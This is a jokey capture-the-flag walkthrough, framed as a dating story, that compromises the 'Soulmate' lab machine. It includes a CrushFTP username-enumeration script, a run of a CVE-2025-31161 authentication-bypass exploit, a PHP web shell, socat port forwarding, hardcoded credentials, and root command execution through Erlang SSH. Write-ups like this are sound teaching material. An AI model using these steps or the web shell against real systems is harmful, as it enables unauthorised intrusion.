**The Matchmaker’s Journal**  

*September 07, 2025 – Somewhere deep in the binary alleys of the cyber-dating world, you’ve been invited to play Cupid. But beware—this dating app doesn’t just break hearts, it breaks servers. And today, you’ll unmask them all.*  

---

## 1. Setting the Stage: Reconnaissance  
You arrive at the doorstep of **Soulmate (10.10.11.86)**, a digital love factory.  
Naturally, you bring your trusty **nmap bouquet** to impress.  

```bash
nmap -p- -sV --min-rate 1000 -oA scans/soulmate-full 10.10.11.86
```

🎶 *Cue dramatic love song* 🎶  
Results reveal:  

- **22/tcp** SSH (OpenSSH 8.9p1)  
- **80/tcp** HTTP (nginx 1.18.0)  
- **4369/tcp** Erlang EPMD (Cupid’s creepy sidekick)  

You add an alias because typing IPs on a date is rude:  

```bash
echo "10.10.11.86 soulmate.htb" | sudo tee -a /etc/hosts
```

---

## 2. Crafting Your Profile: Web Enumeration  
You strut into [http://soulmate.htb](http://soulmate.htb/), where love is supposedly just a click away.  

- You **register** as `you@example.com / Passw0rd!` (classic).  
- You **log in** and peek at the **Profile → Edit** page.  

Options:  
- Name  
- Bio  
- Interests  
- Mobile  
- *And the juiciest part*: **Profile Picture Upload**  

Your hacker intuition whispers: *“File upload… the Tinder of vulnerabilities.”*  

---

## 3. Uncovering a Hidden Door: Subdomain Discovery  
But no dating site is complete without a secret “ex” lurking in the background.  
So you fire up **ffuf**:  

```bash
ffuf -u http://soulmate.htb -H 'Host: FUZZ.soulmate.htb'      -w /usr/share/seclists/Discovery/DNS/big.txt -fs 154
```

💔 Surprise! You find **ftp.soulmate.htb**—a CrushFTP instance.  

```bash
echo "10.10.11.86 ftp.soulmate.htb" | sudo tee -a /etc/hosts
```

---

## 4. Bypassing Security: CrushFTP Exploit  

### 4.1 Username Probing  
You go fishing for names like a desperate stalker scrolling LinkedIn.  

```python
# probe_crushftp.py
import requests
for user in open('/usr/share/seclists/Usernames/top10000.txt'):
    r = requests.post('http://ftp.soulmate.htb/WebInterface/function/',
                      data={'command':'login','username':user.strip(),'password':'x'})
    if 'Invalid password' in r.text:
        print(f"Valid user: {user.strip()}")
```

🎉 Results: `admin` and `root`. Jackpot!  

### 4.2 CVE-2025-31161: Authentication Bypass  
Turns out Cupid forgot to patch. You slip past like a smooth operator:  

```bash
python3 cve-2025-31161.py   --target_host ftp.soulmate.htb --port 80   --target_user admin --new_user matcher --password MatchMe123
```

Congratulations—you’re now the **admin of love**.  

---

## 5. Uploading Your First “Match”: Web Shell  

- You log in as **matcher / MatchMe123**.  
- Give yourself upload rights in `webProd`.  
- Time to woo the server with a shiny new shell:  

```php
<?php if(isset($_REQUEST['cmd'])) {
  echo "<pre>";
  system($_REQUEST['cmd']);
  echo "</pre>";
} ?>
```

Upload → **shell.php**.  

Check:  

```bash
curl 'http://soulmate.htb/shell.php?cmd=id'
```

Response: `uid=33(www-data)`  
✨ You’re officially inside. ✨  

---

## 6. Land of Scripts: Securing an Interactive Shell  

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl-Z
stty raw -echo; fg
export TERM=xterm
```

Now you’re **www-data** with full TTY powers.  

---

## 7. Encountering Erlang: Hidden Service  

You poke around and notice Erlang lurking:  

```bash
ss -plnt | grep 4369
```

Ah yes, Erlang’s love dungeon at **127.0.0.1:2222**.  

---

## 8. Crafting a Bridge: socat Port Forwarding  

```bash
socat TCP-LISTEN:3333,reuseaddr,fork TCP:127.0.0.1:2222 &
```

From Kali:  

```bash
ssh -p 3333 ben@10.10.11.86
```

But… 💔 Wrong password.  

---

## 9. Discovering Hardcoded Credentials  

Every dating app has skeletons in its closet. You grep:  

```bash
grep -R "passwd" -n /usr/local/lib/erlang_login
```

And discover inside `start.escript`:  

```
{username, "ben"}.
{password, "HouseH0ldings998"}.
```

Cupid really should’ve used a password manager.  

---

## 10. Ringing the Bell: Erlang SSH to Root  

```bash
ssh -p 3333 ben@10.10.11.86
```

Inside Erlang shell:  

```erlang
os:cmd("id").
```

Response: `uid=0(root) gid=0(root)`  
💍 You popped the question, and the server said **YES**. Rooted.  

---

## 11. Claiming the Flags  

### 11.1 User Flag  

```erlang
os:cmd("cat /home/ben/user.txt").
```

➡️ **User flag found (hidden for spoilers).**  

### 11.2 Root Flag  

```erlang
os:cmd("cat /root/root.txt").
```

➡️ **Root flag found (hidden for spoilers).**  

---

## Epilogue  

And so, you close **The Matchmaker’s Journal**.  

Soulmate wasn’t about love—it was about:  
- Upload filters forgotten like bad first dates  
- Hardcoded secrets (seriously, Ben? HouseH0ldings998?)  
- Local services exposed like awkward DMs  

You leave with two flags in hand and one lesson in heart:  

**In hacking, as in dating, never trust the first profile picture.**  
